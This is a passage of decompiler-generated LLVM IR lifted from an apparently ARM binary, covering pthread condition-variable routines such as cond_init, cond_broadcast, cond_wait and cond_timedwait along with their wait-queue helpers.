  store i32 %v3_e554, i32* %r7.global-to-local, align 4
  br i1 %v2_e550, label %dec_label_pc_e578, label %dec_label_pc_e560

dec_label_pc_e560:                                ; preds = %dec_label_pc_e54c
  %v1_e560 = inttoptr i32 %v3_e54c to i32*
  %v2_e560 = load i32, i32* %v1_e560, align 4
  store i32 %v2_e560, i32* %r0.global-to-local, align 4
  %v1_e56c = add i32 %v3_e54c, 4
  %v2_e56c = inttoptr i32 %v1_e56c to i32*
  %v3_e56c = load i32, i32* %v2_e56c, align 4
  call void @__pseudo_branch(i32 %v3_e56c)
  %v1_e570 = trunc i32 %v2_e560 to i8
  %v2_e570 = load i32, i32* @r4, align 4
  %v3_e570 = add i32 %v2_e570, 440
  %v4_e570 = inttoptr i32 %v3_e570 to i8*
  store i8 %v1_e570, i8* %v4_e570, align 1
  %v0_e574 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e578

dec_label_pc_e578:                                ; preds = %dec_label_pc_e54c, %dec_label_pc_e560
  %storemerge = phi i32 [ %v0_e574, %dec_label_pc_e560 ], [ 0, %dec_label_pc_e54c ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v0_e578 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e578, i32* %r0.global-to-local, align 4
  %v1_e57c = call i32 @__pthread_unlock(i32 %v0_e578)
  store i32 %v1_e57c, i32* %r0.global-to-local, align 4
  %v2_e580 = icmp eq i32 %storemerge, 0
  store i1 %v2_e580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e580, label %dec_label_pc_e598, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e578
  %v0_e588 = load i32, i32* @r4, align 4
  store i32 %v0_e588, i32* @r0, align 4
  %v0_e58c = call i32 @__pthread_restart_new()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

dec_label_pc_e598:                                ; preds = %dec_label_pc_e578
  %v0_e59c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_e59c, i32* %r0.global-to-local, align 4
  %v0_e5a4 = call i32 @kill()
  %v0_e5a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e5a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_e5a8

; uselistorder directives
  uselistorder i1 %v7_e524, { 1, 0 }
  uselistorder i32 %v3_e4f0, { 1, 0 }
  uselistorder i32 %v3_e4e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 5, 6, 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8), { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e578, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0, 2 }
}

define i32 @_enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0 }
}

define i32 @_remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_e6102 = load i32, i32* @r0, align 4
  %v1_e6103 = inttoptr i32 %v0_e6102 to i32*
  %v2_e6104 = load i32, i32* %v1_e6103, align 4
  store i32 %v2_e6104, i32* %r2.global-to-local, align 4
  %v2_e6146 = icmp eq i32 %v2_e6104, 0
  br i1 %v2_e6146, label %dec_label_pc_e61c, label %dec_label_pc_e5ec

dec_label_pc_e5ec:                                ; preds = %entry, %dec_label_pc_e60c
  %v1_e5fc = phi i32 [ %v1_e5f4, %dec_label_pc_e60c ], [ %v0_e6102, %entry ]
  %v0_e5f4 = phi i32 [ %v2_e610, %dec_label_pc_e60c ], [ %v2_e6104, %entry ]
  %v9_e5ec = icmp eq i32 %v0_e5f4, %arg1
  %v1_e5f4 = add i32 %v0_e5f4, 8
  br i1 %v9_e5ec, label %dec_label_pc_e5f4, label %dec_label_pc_e60c

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e5ec
  %v2_e5f4 = inttoptr i32 %v1_e5f4 to i32*
  %v3_e5f4 = load i32, i32* %v2_e5f4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e5fc = inttoptr i32 %v1_e5fc to i32*
  store i32 %v3_e5f4, i32* %v2_e5fc, align 4
  %v1_e604 = load i32, i32* %r2.global-to-local, align 4
  %v2_e604 = add i32 %v1_e604, 8
  %v3_e604 = inttoptr i32 %v2_e604 to i32*
  store i32 0, i32* %v3_e604, align 4
  %v0_e620.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e620

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e5ec
  %v1_e610 = inttoptr i32 %v1_e5f4 to i32*
  %v2_e610 = load i32, i32* %v1_e610, align 4
  store i32 %v2_e610, i32* %r2.global-to-local, align 4
  %v2_e614 = icmp eq i32 %v2_e610, 0
  br i1 %v2_e614, label %dec_label_pc_e610.dec_label_pc_e61c_crit_edge, label %dec_label_pc_e5ec

dec_label_pc_e610.dec_label_pc_e61c_crit_edge:    ; preds = %dec_label_pc_e60c
  br label %dec_label_pc_e61c

dec_label_pc_e61c:                                ; preds = %dec_label_pc_e610.dec_label_pc_e61c_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e620

dec_label_pc_e620:                                ; preds = %dec_label_pc_e5f4, %dec_label_pc_e61c
  %v0_e620 = phi i32 [ %v0_e620.pre, %dec_label_pc_e5f4 ], [ 0, %dec_label_pc_e61c ]
  ret i32 %v0_e620

; uselistorder directives
  uselistorder i32 %v2_e610, { 1, 2, 0 }
  uselistorder i32 %v1_e5f4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_e620, { 1, 0 }
  uselistorder label %dec_label_pc_e5ec, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_e630 = add i32 %tmp, 8
  %v3_e630 = inttoptr i32 %v2_e630 to i32*
  store i32 0, i32* %v3_e630, align 4
  %v1_e634 = load i32, i32* %r3.global-to-local, align 4
  %v2_e634 = inttoptr i32 %v1_e634 to i32*
  store i32 0, i32* %v2_e634, align 4
  %v1_e638 = load i32, i32* %r3.global-to-local, align 4
  %v2_e638 = add i32 %v1_e638, 4
  %v3_e638 = inttoptr i32 %v2_e638 to i32*
  store i32 0, i32* %v3_e638, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e640 = add i32 %arg1, 8
  %v2_e640 = inttoptr i32 %v1_e640 to i32*
  %v3_e640 = load i32, i32* %v2_e640, align 4
  %v2_e644 = icmp eq i32 %v3_e640, 0
  %. = select i1 %v2_e644, i32 0, i32 16
  ret i32 %.
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %.thread, %bb3, %entry
  %merge = phi i32 [ 22, %entry ], [ 38, %bb3 ], [ 0, %.thread ]
  ret i32 %merge

bb2:                                              ; preds = %entry
  %v2_e67c = icmp eq i32 %arg1, 0
  br i1 %v2_e67c, label %.thread, label %bb3

bb3:                                              ; preds = %bb2
  br label %bb

.thread:                                          ; preds = %bb2
  br label %bb

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @___pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e68c = load i32, i32* @r4, align 4
  store i32 %v3_e68c, i32* %stack_var_-12, align 4
  %v9_e68c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_e690 = icmp eq i32 %arg2, 0
  %v0_e694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e694, i32* %r4.global-to-local, align 4
  br i1 %v2_e690, label %dec_label_pc_e6b0, label %dec_label_pc_e6a0

dec_label_pc_e6a0:                                ; preds = %entry
  %v1_e6a0 = add i32 %v0_e694, 64
  %v2_e6a0 = inttoptr i32 %v1_e6a0 to i8*
  %v3_e6a0 = load i8, i8* %v2_e6a0, align 1
  %v2_e6a4 = icmp eq i8 %v3_e6a0, 0
  br i1 %v2_e6a4, label %dec_label_pc_e6b8, label %bb

bb:                                               ; preds = %dec_label_pc_e6a0
  store i32 %v3_e68c, i32* @r4, align 4
  ret i32 %v0_e694

dec_label_pc_e6b0:                                ; preds = %entry
  %v1_e6b0 = add i32 %v0_e694, 28
  %v2_e6b0 = inttoptr i32 %v1_e6b0 to i32*
  %v3_e6b0 = load i32, i32* %v2_e6b0, align 4
  store i32 %v3_e6b0, i32* %r0.global-to-local, align 4
  %v2_e6b4 = call i32 @__pthread_lock(i32 %v3_e6b0, i32 %v0_e694)
  store i32 %v2_e6b4, i32* %r0.global-to-local, align 4
  %v0_e6b8.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_e6bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e6a0, %dec_label_pc_e6b0
  %v1_e6bc = phi i32 [ %v0_e694, %dec_label_pc_e6a0 ], [ %v1_e6bc.pre, %dec_label_pc_e6b0 ]
  %v0_e6bc = phi i32 [ %arg2, %dec_label_pc_e6a0 ], [ %v0_e6b8.pre, %dec_label_pc_e6b0 ]
  %v2_e6b8 = icmp eq i32 %v0_e6bc, 0
  %v2_e6bc = add i32 %v1_e6bc, 444
  %v3_e6bc = inttoptr i32 %v2_e6bc to i32*
  store i32 %v0_e6bc, i32* %v3_e6bc, align 4
  br i1 %v2_e6b8, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_e6b8
  %v3_e6c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e6c0, i32* @r4, align 4
  %v12_e6c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_e6c0

bb7:                                              ; preds = %dec_label_pc_e6b8
  %v0_e6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e6c4 = add i32 %v0_e6c4, 28
  %v2_e6c4 = inttoptr i32 %v1_e6c4 to i32*
  %v3_e6c4 = load i32, i32* %v2_e6c4, align 4
  store i32 %v3_e6c4, i32* %r0.global-to-local, align 4
  %v2_e6c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e6c8, i32* @r4, align 4
  store i32 %v9_e68c, i32* @lr, align 4
  %v1_e6cc = call i32 @__pthread_unlock(i32 %v3_e6c4)
  store i32 %v1_e6cc, i32* %r0.global-to-local, align 4
  ret i32 %v1_e6cc

; uselistorder directives
  uselistorder i32 %v0_e694, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder label %dec_label_pc_e6b8, { 1, 0 }
}

define i32 @_restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e6d0 = call i32 @__pthread_restart_new()
  ret i32 %v0_e6d0

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 3, 1, 0, 2 }
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v2_e6e0 = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_e6e8 = add i32 %arg1, 8
  %v2_e6e8 = inttoptr i32 %v1_e6e8 to i32*
  %v3_e6e8 = load i32, i32* %v2_e6e8, align 4
  store i32 %v3_e6e8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %v2_e6e8, align 4
  %v1_e6f4 = call i32 @__pthread_unlock(i32 %arg1)
  %v0_e71c.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_e71c2 = icmp eq i32 %v0_e71c.pr, 0
  br i1 %v2_e71c2, label %dec_label_pc_e724, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %entry, %dec_label_pc_e6fc
  %v2_e700 = phi i32 [ %v0_e718, %dec_label_pc_e6fc ], [ %v0_e71c.pr, %entry ]
  %v3_e700 = add i32 %v2_e700, 441
  %v4_e700 = inttoptr i32 %v3_e700 to i8*
  store i8 1, i8* %v4_e700, align 1
  %v0_e708 = load i32, i32* %r5.global-to-local, align 4
  %v1_e708 = add i32 %v0_e708, 8
  %v2_e708 = inttoptr i32 %v1_e708 to i32*
  %v3_e708 = load i32, i32* %v2_e708, align 4
  store i32 %v3_e708, i32* @r4, align 4
  store i32 0, i32* %v2_e708, align 4
  %v0_e710 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e710, i32* @r0, align 4
  %v1_e714 = call i32 @_restart(i32 %v0_e710)
  %v0_e718 = load i32, i32* @r4, align 4
  store i32 %v0_e718, i32* %r5.global-to-local, align 4
  %v2_e71c = icmp eq i32 %v0_e718, 0
  br i1 %v2_e71c, label %dec_label_pc_e724, label %dec_label_pc_e6fc

dec_label_pc_e724:                                ; preds = %dec_label_pc_e6fc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e718, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e6fc, { 1, 0 }
}

define i32 @_thread_self.6() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_e730 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_e734 = load i32, i32* @sp, align 4
  %v3_e734 = icmp ult i32 %v0_e734, %v2_e730
  %v1_e738 = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_e734, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_e754, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_e754 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_e748 = load i32, i32* @global_var_2be50.182, align 4
  %v3_e74c = icmp ult i32 %v0_e734, %v2_e748
  br i1 %v3_e74c, label %bb4, label %dec_label_pc_e754

dec_label_pc_e754:                                ; preds = %bb3
  %v2_e758 = load i32, i32* @global_var_2be54.184, align 4
  %v3_e75c = icmp ult i32 %v0_e734, %v2_e758
  br i1 %v3_e75c, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_e754, %bb3
  %v2_e76c = load i32, i32* @global_var_30238.188, align 4
  %v3_e770 = and i32 %v1_e738, -2097152
  %v4_e770 = xor i32 %v3_e770, -2097152
  %v2_e778 = icmp eq i32 %v2_e76c, 0
  %v1_e77c = sub i32 -477, %v4_e770
  br i1 %v2_e778, label %dec_label_pc_e788, label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %bb4
  %v1_e784 = call i32 @__pthread_find_self(i32 %v1_e77c)
  br label %dec_label_pc_e788

dec_label_pc_e788:                                ; preds = %bb4, %dec_label_pc_e784
  %v0_e788 = phi i32 [ %v1_e77c, %bb4 ], [ %v1_e784, %dec_label_pc_e784 ]
  %v1_e788 = add i32 %v0_e788, -3
  ret i32 %v1_e788

; uselistorder directives
  uselistorder i32 %v1_e77c, { 1, 0 }
  uselistorder label %dec_label_pc_e788, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_e7b8 = call i32 @_thread_self.6()
  %v2_e7c8 = call i32 @__pthread_lock(i32 %arg1, i32 %v0_e7b8)
  %v1_e7d0 = add i32 %arg1, 8
  store i32 %v1_e7d0, i32* @r0, align 4
  %v2_e7d4 = call i32 @_remove_from_queue(i32 %v1_e7d0, i32 %arg2)
  %v1_e7e0 = call i32 @__pthread_unlock(i32 %arg1)
  ret i32 %v2_e7d4
}

define i32 @_suspend.7(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e7f0 = load i32, i32* @r0, align 4
  %v1_e7f0 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_e7f0)
  ret i32 %v1_e7f0
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_e7f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_e808 = call i32 @_thread_self.6()
  %v0_e80c = load i32, i32* @r6, align 4
  %v1_e80c = add i32 %v0_e80c, 12
  %v2_e80c = inttoptr i32 %v1_e80c to i32*
  %v3_e80c = load i32, i32* %v2_e80c, align 4
  %v7_e810 = icmp eq i32 %v3_e80c, 3
  br i1 %v7_e810, label %dec_label_pc_e834, label %bb

bb:                                               ; preds = %entry
  %v3_e814 = icmp eq i32 %v3_e80c, 0
  br i1 %v3_e814, label %dec_label_pc_e834, label %dec_label_pc_e820

dec_label_pc_e820:                                ; preds = %bb
  %v1_e824 = add i32 %v0_e80c, 8
  %v2_e824 = inttoptr i32 %v1_e824 to i32*
  %v3_e824 = load i32, i32* %v2_e824, align 4
  %v9_e828 = icmp eq i32 %v3_e824, %v0_e808
  br i1 %v9_e828, label %dec_label_pc_e834, label %bb30

bb30:                                             ; preds = %dec_label_pc_e820
  br label %dec_label_pc_e9e4

dec_label_pc_e834:                                ; preds = %entry, %dec_label_pc_e820, %bb
  %v0_e844 = load i32, i32* @r5, align 4
  store i32 %v0_e844, i32* %stack_var_-40, align 4
  %v3_e848 = add i32 %v0_e808, 441
  %v4_e848 = inttoptr i32 %v3_e848 to i8*
  store i8 0, i8* %v4_e848, align 1
  %v2_e854 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 %v2_e7f8)
  %v0_e858 = load i32, i32* @r5, align 4
  %v2_e860 = call i32 @__pthread_lock(i32 %v0_e858, i32 %v0_e808)
  %v1_e868 = add i32 %v0_e808, 66
  %v2_e868 = inttoptr i32 %v1_e868 to i8*
  %v3_e868 = load i8, i8* %v2_e868, align 1
  %v2_e86c = icmp eq i8 %v3_e868, 0
  br i1 %v2_e86c, label %dec_label_pc_e888, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %dec_label_pc_e834
  %v1_e878 = add i32 %v0_e808, 64
  %v2_e878 = inttoptr i32 %v1_e878 to i8*
  %v3_e878 = load i8, i8* %v2_e878, align 1
  %v2_e87c = icmp eq i8 %v3_e878, 0
  br i1 %v2_e87c, label %dec_label_pc_e898, label %dec_label_pc_e888

dec_label_pc_e888:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e834
  %v0_e88c = load i32, i32* @r5, align 4
  %v1_e88c = add i32 %v0_e88c, 8
  %v2_e890 = call i32 @_enqueue(i32 %v1_e88c, i32 %v0_e808)
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e888
  %storemerge19 = phi i32 [ 0, %dec_label_pc_e888 ], [ 1, %dec_label_pc_e874 ]
  store i32 %storemerge19, i32* @r4, align 4
  %v0_e898 = load i32, i32* @r5, align 4
  %v1_e89c = call i32 @__pthread_unlock(i32 %v0_e898)
  %v0_e8a0 = load i32, i32* @r4, align 4
  %v2_e8a0 = icmp eq i32 %v0_e8a0, 0
  br i1 %v2_e8a0, label %dec_label_pc_e8b8, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e898
  %v2_e8b0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 0)
  br label %dec_label_pc_e990

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e898
  %v0_e8b8 = load i32, i32* @r6, align 4
  store i32 %v0_e8b8, i32* @r0, align 4
  store i32 59592, i32* @lr, align 4
  %v1_e8c4 = call i32 @pthread_mutex_unlock()
  %v0_e8c8 = load i32, i32* @r4, align 4
  %v1_e928 = add i32 %v0_e808, 440
  %v2_e928 = inttoptr i32 %v1_e928 to i8*
  %v1_e938 = add i32 %v0_e808, 64
  %v2_e938 = inttoptr i32 %v1_e938 to i8*
  br label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e944, %dec_label_pc_e8b8
  %storemerge = phi i32 [ %v0_e8c8, %dec_label_pc_e8b8 ], [ %v1_e944, %dec_label_pc_e944 ]
  store i32 %storemerge, i32* @r8, align 4
  %v0_e8d0 = load i32, i32* @sl, align 4
  %v2_e8d4 = inttoptr i32 %v0_e8d0 to i32*
  %v3_e8d4 = call i32 @__pthread_timedsuspend_new(i32 %v0_e808, i32* %v2_e8d4)
  store i32 %v3_e8d4, i32* @r7, align 4
  %v2_e8d8 = icmp eq i32 %v3_e8d4, 0
  br i1 %v2_e8d8, label %dec_label_pc_e8e0, label %dec_label_pc_e914

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8cc
  %v0_e8e4 = load i32, i32* @r5, align 4
  %v2_e8e8 = call i32 @__pthread_lock(i32 %v0_e8e4, i32 %v0_e808)
  %v0_e8ec = load i32, i32* @r5, align 4
  %v1_e8ec = add i32 %v0_e8ec, 8
  store i32 %v1_e8ec, i32* @r0, align 4
  %v2_e8f4 = call i32 @_remove_from_queue(i32 %v1_e8ec, i32 %v0_e808)
  store i32 %v2_e8f4, i32* @r4, align 4
  %v0_e8fc = load i32, i32* @r5, align 4
  %v1_e900 = call i32 @__pthread_unlock(i32 %v0_e8fc)
  %v0_e904 = load i32, i32* @r4, align 4
  %v2_e904 = icmp eq i32 %v0_e904, 0
  br i1 %v2_e904, label %dec_label_pc_e90c, label %dec_label_pc_e99c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e8e0
  store i32 %v0_e808, i32* @r0, align 4
  %v1_e910 = call i32 @_suspend.7(i32 %v0_e808)
  br label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e8cc, %dec_label_pc_e90c
  %v3_e918 = load i8, i8* %v4_e848, align 1
  %v2_e91c = icmp eq i8 %v3_e918, 0
  br i1 %v2_e91c, label %dec_label_pc_e924, label %dec_label_pc_e94c

dec_label_pc_e924:                                ; preds = %dec_label_pc_e914
  %v3_e928 = load i8, i8* %v2_e928, align 1
  %v2_e92c = icmp eq i8 %v3_e928, 0
  br i1 %v2_e92c, label %dec_label_pc_e944, label %dec_label_pc_e934

dec_label_pc_e934:                                ; preds = %dec_label_pc_e924
  %v3_e938 = load i8, i8* %v2_e938, align 1
  %v2_e93c = icmp eq i8 %v3_e938, 0
  br i1 %v2_e93c, label %dec_label_pc_e94c, label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %dec_label_pc_e934, %dec_label_pc_e924
  %v0_e944 = load i32, i32* @r8, align 4
  %v1_e944 = add i32 %v0_e944, 1
  br label %dec_label_pc_e8cc

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e914, %dec_label_pc_e934
  %v2_e954 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 0)
  %v3_e95c = load i8, i8* %v2_e928, align 1
  %v2_e960 = icmp eq i8 %v3_e95c, 0
  br i1 %v2_e960, label %dec_label_pc_e9c8.preheader, label %dec_label_pc_e968

dec_label_pc_e968:                                ; preds = %dec_label_pc_e94c
  %v3_e96c = load i8, i8* %v2_e938, align 1
  %v2_e970 = icmp eq i8 %v3_e96c, 0
  br i1 %v2_e970, label %dec_label_pc_e978, label %dec_label_pc_e9c8.preheader

dec_label_pc_e9c8.preheader:                      ; preds = %dec_label_pc_e94c, %dec_label_pc_e968
  %v0_e9c89 = load i32, i32* @r8, align 4
  %v1_e9c810 = add i32 %v0_e9c89, -1
  store i32 %v1_e9c810, i32* @r8, align 4
  %v2_e9c811 = icmp eq i32 %v0_e9c89, 0
  br i1 %v2_e9c811, label %dec_label_pc_e9d0, label %dec_label_pc_e9c0

dec_label_pc_e978:                                ; preds = %dec_label_pc_e968
  %v0_e97c = load i32, i32* @r6, align 4
  store i8 0, i8* %v2_e928, align 1
  store i32 59792, i32* @lr, align 4
  %v2_e98c = call i32 @pthread_mutex_lock(i32 %v0_e97c)
  br label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e8a8, %dec_label_pc_e978
  %v2_e998 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_e7f8)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e8e0, %dec_label_pc_e990
  %v0_e9a0 = load i32, i32* @r7, align 4
  %v2_e9a4 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 %v0_e9a0)
  %v0_e9a8 = load i32, i32* @r6, align 4
  %v2_e9b4 = call i32 @pthread_mutex_lock(i32 %v0_e9a8)
  br label %dec_label_pc_e9e4

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e9c8.preheader
  store i32 %v0_e808, i32* @r0, align 4
  %v1_e9c4 = call i32 @_restart(i32 %v0_e808)
  %v0_e9c8 = load i32, i32* @r8, align 4
  %v1_e9c8 = add i32 %v0_e9c8, -1
  store i32 %v1_e9c8, i32* @r8, align 4
  %v2_e9c8 = icmp eq i32 %v0_e9c8, 0
  br i1 %v2_e9c8, label %dec_label_pc_e9d0, label %dec_label_pc_e9c0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e9c8.preheader
  %v0_e9d0 = load i32, i32* @r6, align 4
  %v2_e9dc = call i32 @pthread_mutex_lock(i32 %v0_e9d0)
  br label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %bb30, %dec_label_pc_e99c, %dec_label_pc_e9d0
  %v23_e9e8 = phi i32 [ 22, %bb30 ], [ 110, %dec_label_pc_e99c ], [ 0, %dec_label_pc_e9d0 ]
  ret i32 %v23_e9e8

; uselistorder directives
  uselistorder i8* %v2_e928, { 1, 0, 2 }
  uselistorder i32 %v0_e808, { 8, 7, 17, 9, 13, 12, 14, 15, 16, 10, 11, 6, 4, 5, 3, 2, 1, 0, 18 }
  uselistorder label %dec_label_pc_e9e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e99c, { 1, 0 }
  uselistorder label %dec_label_pc_e990, { 1, 0 }
  uselistorder label %dec_label_pc_e9c8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 0 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %dec_label_pc_e898, { 1, 0 }
  uselistorder label %dec_label_pc_e834, { 1, 2, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_e9f8 = load i32, i32* @r4, align 4
  %v6_e9f8 = load i32, i32* @r5, align 4
  %v2_e9fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_ea08 = call i32 @_thread_self.6()
  %v0_ea0c = load i32, i32* @r6, align 4
  %v1_ea0c = add i32 %v0_ea0c, 12
  %v2_ea0c = inttoptr i32 %v1_ea0c to i32*
  %v3_ea0c = load i32, i32* %v2_ea0c, align 4
  %v7_ea10 = icmp eq i32 %v3_ea0c, 3
  br i1 %v7_ea10, label %dec_label_pc_ea34, label %bb

bb:                                               ; preds = %entry
  %v3_ea14 = icmp eq i32 %v3_ea0c, 0
  br i1 %v3_ea14, label %dec_label_pc_ea34, label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %bb
  store i32 %v0_ea08, i32* @r2, align 4
  %v1_ea24 = add i32 %v0_ea0c, 8
  %v2_ea24 = inttoptr i32 %v1_ea24 to i32*
  %v3_ea24 = load i32, i32* %v2_ea24, align 4
  %v9_ea28 = icmp eq i32 %v3_ea24, %v0_ea08
  br i1 %v9_ea28, label %dec_label_pc_ea34, label %dec_label_pc_eb7c

dec_label_pc_ea34:                                ; preds = %entry, %dec_label_pc_ea20, %bb
  %v0_ea44 = load i32, i32* @r5, align 4
  store i32 %v0_ea44, i32* %stack_var_-28, align 4
  %v3_ea48 = add i32 %v0_ea08, 441
  %v4_ea48 = inttoptr i32 %v3_ea48 to i8*
  store i8 0, i8* %v4_ea48, align 1
  %v2_ea54 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 %v2_e9fc)
  %v0_ea58 = load i32, i32* @r5, align 4
  %v2_ea60 = call i32 @__pthread_lock(i32 %v0_ea58, i32 %v0_ea08)
  %v1_ea68 = add i32 %v0_ea08, 66
  %v2_ea68 = inttoptr i32 %v1_ea68 to i8*
  %v3_ea68 = load i8, i8* %v2_ea68, align 1
